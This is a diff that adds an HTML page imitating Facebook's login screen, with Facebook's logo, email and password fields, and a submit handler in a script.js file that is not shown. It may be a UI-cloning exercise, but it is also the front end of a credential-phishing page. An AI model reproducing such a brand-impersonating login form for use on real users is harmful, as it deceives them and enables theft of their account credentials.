@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook login</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="login-header">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook">
+    </div>
+    
+    <div class="login-container">
+        <main>
+            <div class="login">Log in to Facebook</div>
+            <form action="post" id="form" name="form">
+                <div class="login-form">
+                    <input type="email" id="email" name="email" placeholder="Email address or phone number">
+                    <input type="password" id="password" name="password" placeholder="Password">
+                    <button class="submit" type="submit" onClick="auth(event)">Log in</button>
+                </div>
+            </form>
+        </main>   
+
+        <div class="login-footer">
+            <a href="#">Forgotten account?</a> . 
+            <a href="#">Sign up for Facebook</a>
+        </div>
+    </div>
+
+<script src="script.js"></script>
+
+</body>
+</html>
